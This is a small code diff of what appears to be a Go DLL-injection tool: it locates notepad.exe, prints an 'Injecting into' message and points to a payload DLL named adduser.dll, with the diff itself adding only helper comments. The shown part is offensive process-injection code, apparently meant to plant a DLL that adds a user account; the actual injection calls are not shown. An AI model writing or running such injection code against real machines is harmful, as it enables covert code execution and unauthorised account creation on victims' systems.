@@ -34,13 +34,16 @@ func findProcess(proc string) int {
 }
 
 func main() {
+	// Open notepad.exe before running it...
 	pid := findProcess("notepad.exe")
 	fmt.Printf("    [*] Injecting into notepad.exe, PID=[%d]\n", pid)
 	if pid == 0 {
 		panic("Cannot find notepad.exe process")
 	}
 	
+	// Point to your DLL here...
 	dll := "C:\\users\\operator\\Downloads\\adduser.dll"
+
 	dllname := append([]byte(dll), 0)
 	dlllen := len(dllname)
 	kernel32 := windows.NewLazySystemDLL("kernel32.dll")
